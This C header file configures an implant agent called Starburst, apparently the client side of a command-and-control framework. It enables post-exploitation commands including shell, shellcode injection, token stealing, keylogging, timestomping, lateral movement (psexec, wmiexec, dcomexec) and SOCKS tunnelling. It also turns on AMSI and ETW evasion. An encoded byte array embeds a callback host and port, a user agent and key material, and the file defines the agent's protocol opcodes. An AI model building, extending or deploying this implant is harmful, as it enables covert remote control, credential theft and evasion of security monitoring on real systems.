#ifndef STARBURST_CONFIG_H
#define STARBURST_CONFIG_H

#ifdef _MANUAL

#define HTTP_TRANSPORT
#define INCLUDE_CMD_EXIT
#define INCLUDE_CMD_SLEEP
#define INCLUDE_CMD_SHELL
#define INCLUDE_CMD_WHOAMI
#define INCLUDE_CMD_PWD
#define INCLUDE_CMD_CD
#define INCLUDE_CMD_LS
#define INCLUDE_CMD_PS
#define INCLUDE_CMD_CONFIG
#define INCLUDE_CMD_UPLOAD
#define INCLUDE_CMD_DOWNLOAD
#define INCLUDE_CMD_SHINJECT
#define INCLUDE_CMD_EXECUTE_PIC
#define INCLUDE_CMD_CAT
#define INCLUDE_CMD_MKDIR
#define INCLUDE_CMD_RM
#define INCLUDE_CMD_CP
#define INCLUDE_CMD_MV
#define INCLUDE_CMD_ENV
#define INCLUDE_CMD_REG_QUERY
#define INCLUDE_CMD_SCREENSHOT
#define INCLUDE_CMD_TOKEN_LIST
#define INCLUDE_CMD_EXECUTE_ASSEMBLY
#define INCLUDE_CMD_EXECUTE_COFF
#define INCLUDE_CMD_JUMP_PSEXEC
#define INCLUDE_CMD_JUMP_SCSHELL
#define INCLUDE_CMD_JUMP_WMIEXEC
#define INCLUDE_CMD_JUMP_DCOMEXEC
#define INCLUDE_CMD_IFCONFIG
#define INCLUDE_CMD_NETSTAT
#define INCLUDE_CMD_KILL
#define INCLUDE_CMD_RUN
#define INCLUDE_CMD_GETPRIVS
#define INCLUDE_CMD_LISTPIPES
#define INCLUDE_CMD_REG_WRITE_VALUE
#define INCLUDE_CMD_MAKE_TOKEN
#define INCLUDE_CMD_STEAL_TOKEN
#define INCLUDE_CMD_REV2SELF
#define INCLUDE_CMD_NET_LOCALGROUP
#define INCLUDE_CMD_NET_LOCALGROUP_MEMBER
#define INCLUDE_CMD_JOBKILL
#define INCLUDE_CMD_LINK
#define INCLUDE_CMD_UNLINK
#define INCLUDE_CMD_SOCKS
#define INCLUDE_CMD_SSH
#define INCLUDE_CMD_RPFWD
#define INCLUDE_CMD_MIGRATE
#define INCLUDE_CMD_BLOCKDLLS
#define INCLUDE_CMD_KEYLOG
#define INCLUDE_CMD_ENUMDESKTOPS
#define INCLUDE_CMD_TIMESTOMP
#define INCLUDE_CMD_LOCALTIME
#define INCLUDE_CMD_IDLETIME
#define INCLUDE_CMD_GETUID
#define INCLUDE_CMD_BROWSERPIVOT
#define INCLUDE_CMD_CONNECT
#define INCLUDE_CMD_DISCONNECT
#define INCLUDE_CMD_POWERPICK
#define INCLUDE_CMD_SPAWNTO_X64
#define INCLUDE_CMD_SPAWNTO_X86

#define INCLUDE_EVASION_SPOOF
#define INCLUDE_EVASION_AMSI
#define INCLUDE_EVASION_ETW
#define SPOOF_PROFILE SPOOF_PROFILE_CUSTOM
#define INJECTION_TECHNIQUE INJECT_CRT
#define SLEEP_MASK_TYPE MASK_DEFAULT

#define S_AGENT_CONFIG { \
    0x39, 0x33, 0x32, 0x30, 0x35, 0x61, 0x31, 0x64, 0x2d, 0x34, 0x61, 0x66, \
    0x31, 0x2d, 0x34, 0x37, 0x64, 0x37, 0x2d, 0x38, 0x32, 0x33, 0x39, 0x2d, \
    0x38, 0x62, 0x66, 0x66, 0x38, 0x66, 0x64, 0x39, 0x63, 0x61, 0x61, 0x62, \
    0x28, 0xf3, 0x3f, 0xbe, 0x10, 0x8a, 0xb7, 0xc4, 0x84, 0x6a, 0x17, 0x86, \
    0xa3, 0x8f, 0xcc, 0x24, 0x76, 0x4b, 0x7c, 0xcf, 0x7f, 0xb4, 0x1e, 0xad, \
    0xa0, 0xef, 0xc5, 0x85, 0xc6, 0x22, 0x5a, 0xfa, 0x00, 0x00, 0x13, 0x88, \
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, \
    0x31, 0x30, 0x2e, 0x33, 0x2e, 0x34, 0x30, 0x2e, 0x31, 0x00, 0x00, 0x24, \
    0xe3, 0x01, 0x00, 0x00, 0x00, 0x0b, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, \
    0x61, 0x2f, 0x35, 0x2e, 0x30, 0x00, 0x00, 0x00, 0x0d, 0x61, 0x67, 0x65, \
    0x6e, 0x74, 0x5f, 0x6d, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x00, 0x00, \
    0x00, 0x0d, 0x61, 0x67, 0x65, 0x6e, 0x74, 0x5f, 0x6d, 0x65, 0x73, 0x73, \
    0x61, 0x67, 0x65, 0x00, 0x00, 0x00, 0x01, 0x71, 0x00 \
}

#else

%TRANSPORT_DEFINE%
#define S_AGENT_CONFIG { %CONFIG_BYTES% }
%COMMAND_DEFINES%
%EVASION_DEFINES%

#endif

#define CHUNK_SIZE      512000
#define MAX_SEND_SIZE   524288

#define ACTION_CHECKIN       0x01
#define ACTION_GET_TASKING   0x02
#define ACTION_POST_RESPONSE 0x03
#define ACTION_CHECKIN_RSP   0x04

#define CMD_EXIT     0x01
#define CMD_SLEEP    0x02
#define CMD_SHELL    0x03
#define CMD_UPLOAD   0x04
#define CMD_DOWNLOAD 0x05
#define CMD_LS       0x06
#define CMD_CD       0x07
#define CMD_PWD      0x08
#define CMD_PS       0x09
#define CMD_WHOAMI   0x0A
#define CMD_CONFIG      0x0B
#define CMD_SHINJECT          0x0C
#define CMD_EXECUTE_PIC       0x0D
#define CMD_CAT               0x0E
#define CMD_MKDIR             0x0F
#define CMD_RM                0x10
#define CMD_CP                0x11
#define CMD_MV                0x12
#define CMD_ENV               0x13
#define CMD_REG_QUERY         0x14
#define CMD_SCREENSHOT        0x15
#define CMD_TOKEN_LIST        0x16
#define CMD_EXECUTE_ASSEMBLY  0x17
#define CMD_EXECUTE_COFF      0x18
#define CMD_JUMP_PSEXEC       0x19
#define CMD_JUMP_SCSHELL      0x1A
#define CMD_JUMP_WMIEXEC      0x1B
#define CMD_JUMP_DCOMEXEC     0x1C
#define CMD_IFCONFIG          0x1D
#define CMD_NETSTAT           0x1E
#define CMD_KILL              0x1F
#define CMD_RUN               0x20
#define CMD_GETPRIVS          0x21
#define CMD_LISTPIPES         0x22
#define CMD_REG_WRITE_VALUE   0x23
#define CMD_MAKE_TOKEN        0x24
#define CMD_STEAL_TOKEN       0x25
#define CMD_REV2SELF          0x26
#define CMD_NET_LOCALGROUP    0x27
#define CMD_NET_LOCALGROUP_MEMBER 0x28
#define CMD_JOBKILL               0x29
#define CMD_LINK                  0x2A
#define CMD_UNLINK                0x2B
#define CMD_DOWNLOAD_RESP         0x2C
#define CMD_SOCKS                 0x2D
#define CMD_SSH                   0x2E
#define CMD_RPFWD                 0x2F
#define CMD_MIGRATE               0x30
#define CMD_BLOCKDLLS             0x31
#define CMD_KEYLOG                0x32
#define CMD_ENUMDESKTOPS          0x33
#define CMD_TIMESTOMP             0x34
#define CMD_LOCALTIME             0x35
#define CMD_IDLETIME              0x36
#define CMD_GETUID                0x37
#define CMD_BROWSERPIVOT          0x38
#define CMD_CONNECT               0x39
#define CMD_DISCONNECT            0x3A
#define CMD_POWERPICK            0x3B
#define CMD_SPAWNTO_X64           0x3C
#define CMD_SPAWNTO_X86           0x3D

#define RESPONSE_SUCCESS    0x00
#define RESPONSE_ERROR      0x01
#define RESPONSE_PROCESSING 0x02

#define DOWNLOAD_INIT     0x10
#define DOWNLOAD_CHUNK    0x11
#define UPLOAD_REQUEST    0x12
#define UPLOAD_CHUNK_RSP  0x13

#define ACTION_LINK_ADD    0x05
#define ACTION_LINK_MSG    0x06
#define ACTION_LINK_REMOVE 0x07
#define ACTION_SOCKS_MSG   0x08
#define ACTION_RPFWD_MSG   0x09

#define PIPE_BUFFER_MAX       0x10000
#define MAX_SMB_PKTS_PER_LOOP 30
#define MAX_TCP_PKTS_PER_LOOP 30

#define C2_PROFILE_SMB 0x00
#define C2_PROFILE_TCP 0x01

#endif
